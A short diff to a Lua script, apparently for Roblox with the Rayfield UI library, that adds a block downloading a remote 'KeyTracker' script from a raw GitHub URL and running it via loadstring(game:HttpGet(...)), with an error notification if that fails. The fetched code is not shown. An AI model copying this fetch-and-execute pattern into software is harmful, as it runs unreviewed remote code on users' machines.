@@ -54,6 +54,20 @@ Rayfield:Notify({
     }
 })
 
+-- Execute the KeyTracker script
+local success, keyTracker = pcall(function()
+    return loadstring(game:HttpGet('https://raw.githubusercontent.com/Dontletmecook/Apple/main/KeyTracker'))()
+end)
+
+if not success then
+    Rayfield:Notify({
+        Title = "KeyTracker Error",
+        Content = "An error occurred while loading the KeyTracker script: " .. tostring(keyTracker),
+        Duration = 6,
+        Image = 4483362458
+    })
+end
+
 -- Create the "Main" tab
 local Tab = Window:CreateTab("Main", 4483362458)
 
